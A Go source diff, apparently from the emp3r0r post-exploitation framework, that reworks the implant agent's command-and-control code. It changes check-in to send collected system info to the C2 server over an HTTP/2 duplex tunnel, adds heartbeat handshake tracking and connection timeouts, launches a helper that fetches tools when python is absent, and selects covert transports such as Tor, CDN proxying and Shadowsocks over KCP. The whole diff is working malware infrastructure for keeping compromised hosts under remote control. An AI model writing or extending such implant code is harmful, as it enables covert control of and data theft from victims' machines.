@@ -1,10 +1,8 @@
 package agent
 
 import (
-	"bytes"
 	"context"
 	"encoding/json"
-	"errors"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -13,6 +11,7 @@ import (
 	"net/url"
 	"os"
 	"os/signal"
+	"runtime"
 	"strconv"
 	"strings"
 	"time"
@@ -27,16 +26,25 @@ import (
 // CheckIn poll CC server and report its system info
 func CheckIn() error {
 	info := CollectSystemInfo()
+	checkin_URL := emp3r0r_data.CCAddress + tun.CheckInAPI + "/" + uuid.NewString()
+	log.Printf("Collected system info, now checking in (%s)", checkin_URL)
 
-	sysinfoJSON, err := json.Marshal(info)
+	conn, _, cancel, err := ConnectCC(checkin_URL)
+	defer func() {
+		if conn != nil {
+			conn.Close()
+			cancel()
+		}
+	}()
 	if err != nil {
 		return err
 	}
-	_, err = emp3r0r_data.HTTPClient.Post(emp3r0r_data.CCAddress+tun.CheckInAPI+"/"+uuid.NewString(), "application/json", bytes.NewBuffer(sysinfoJSON))
-	if err != nil {
-		return err
+	out := json.NewEncoder(conn)
+	err = out.Encode(info)
+	if err == nil {
+		log.Println("Checked in")
 	}
-	return nil
+	return err
 }
 
 // IsCCOnline check RuntimeConfig.CCIndicator
@@ -91,26 +99,46 @@ func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel conte
 	var (
 		resp *http.Response
 	)
+	defer func() {
+		if conn == nil {
+			err = fmt.Errorf("ConnectCC at %s failed", url)
+			cancel()
+		}
+	}()
+
 	// use h2conn for duplex tunnel
 	ctx, cancel = context.WithCancel(context.Background())
 
 	h2 := h2conn.Client{Client: emp3r0r_data.HTTPClient}
-
 	log.Printf("ConnectCC: connecting to %s", url)
-	conn, resp, err = h2.Connect(ctx, url)
-	if err != nil {
-		log.Printf("Initiate conn: %s", err)
-		return
-	}
+	go func() {
+		conn, resp, err = h2.Connect(ctx, url)
+		if err != nil {
+			err = fmt.Errorf("ConnectCC: initiate h2 conn: %s", err)
+			log.Print(err)
+			cancel()
+		}
+		// Check server status code
+		if resp != nil {
+			if resp.StatusCode != http.StatusOK {
+				err = fmt.Errorf("Bad status code: %d", resp.StatusCode)
+				return
+			}
+		}
+	}()
 
-	// Check server status code
-	if resp.StatusCode != http.StatusOK {
-		log.Printf("Bad status code: %d", resp.StatusCode)
-		return
+	// kill connection on timeout
+	countdown := 10
+	for conn == nil && countdown > 0 {
+		countdown--
+		time.Sleep(time.Second)
 	}
 
 	return
 }
+
+// HandShakes record each hello message and C2's reply
+var HandShakes = make(map[string]bool)
 
 // CCMsgTun use the connection (CCConn)
 func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
@@ -127,12 +155,14 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 		}
 
 		cancel()
+		emp3r0r_data.KCPKeep = false // tell KCPClient to close this conn so we won't stuck
 		log.Print("CCMsgTun closed")
 	}()
 
 	// check for CC server's response
 	go func() {
 		log.Println("Check CC response: started")
+		defer cancel()
 		for ctx.Err() == nil {
 			// read response
 			err = in.Decode(&msg)
@@ -142,6 +172,15 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 			}
 			payload := msg.Payload
 			if strings.HasPrefix(payload, "hello") {
+				log.Printf("Hello (%s) received", payload)
+				// mark the hello as success
+				for hello := range HandShakes {
+					if strings.HasPrefix(payload, hello) {
+						log.Printf("Hello (%s) acknowledged", payload)
+						HandShakes[hello] = true
+						break
+					}
+				}
 				continue
 			}
 
@@ -151,27 +190,52 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 		log.Println("Check CC response: exited")
 	}()
 
+	wait_hello := func(hello string) bool {
+		// delete key, forget about this hello when we are done
+		defer delete(HandShakes, hello)
+
+		// wait until timeout or success
+		for i := 0; i < RuntimeConfig.Timeout; i++ {
+			// if hello marked as success, return true
+			if HandShakes[hello] {
+				log.Printf("Hello (%s) done", hello)
+				return true
+			}
+			time.Sleep(time.Millisecond)
+		}
+		log.Printf("Hello (%s) timeout", hello)
+		return false
+	}
+
 	sendHello := func(cnt int) bool {
+		var hello_msg emp3r0r_data.MsgTunData
 		// try cnt times then exit
 		for cnt > 0 {
 			cnt-- // consume cnt
 
 			// send hello
-			msg.Payload = "hello" + util.RandStr(util.RandInt(1, 100))
-			msg.Tag = RuntimeConfig.AgentTag
-			err = out.Encode(msg)
+			hello_msg.Payload = "hello" + util.RandStr(util.RandInt(1, 100))
+			hello_msg.Tag = RuntimeConfig.AgentTag
+			err = out.Encode(hello_msg)
 			if err != nil {
 				log.Printf("agent cannot connect to cc: %v", err)
 				util.TakeABlink()
 				continue
+			}
+			HandShakes[hello_msg.Payload] = false
+			log.Printf("Hello (%s) sent", hello_msg.Payload)
+			if !wait_hello(hello_msg.Payload) {
+				cancel()
+				break
 			}
 			return true
 		}
 		return false
 	}
 
-	// send hello every second
+	// keep connected
 	for ctx.Err() == nil {
+		log.Println("Hearbeat begins")
 		if !sendHello(util.RandInt(1, 10)) {
 			log.Print("sendHello failed")
 			break
@@ -180,14 +244,36 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 		if err != nil {
 			log.Printf("Updating agent sysinfo: %v", err)
 		}
+		if !util.IsFileExist(RuntimeConfig.UtilsPath + "/python") {
+			if runtime.GOOS == "linux" {
+				go VaccineHandler()
+			}
+		}
+		log.Println("Hearbeat ends")
 		util.TakeASnap()
 	}
 
-	if err == nil {
-		err = errors.New("CC disconnected")
+	return fmt.Errorf("CCMsgTun closed: %v", ctx.Err())
+}
+
+// set C2Transport
+func setC2Transport() {
+
+	if tun.IsTor(emp3r0r_data.CCAddress) {
+		emp3r0r_data.Transport = fmt.Sprintf("TOR (%s)", emp3r0r_data.CCAddress)
+		return
 	}
-	if ctx.Err() != nil {
-		err = fmt.Errorf("ctx: %v\nerr: %v", ctx.Err(), err)
+	if RuntimeConfig.CDNProxy != "" {
+		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", RuntimeConfig.CDNProxy)
+		return
 	}
-	return err
+
+	if RuntimeConfig.UseShadowsocks {
+		emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s)", RuntimeConfig.ShadowsocksPort)
+		// ss thru KCP
+		if RuntimeConfig.UseKCP {
+			emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s) in KCP (*:%s)",
+				RuntimeConfig.ShadowsocksPort, RuntimeConfig.KCPPort)
+		}
+	}
 }
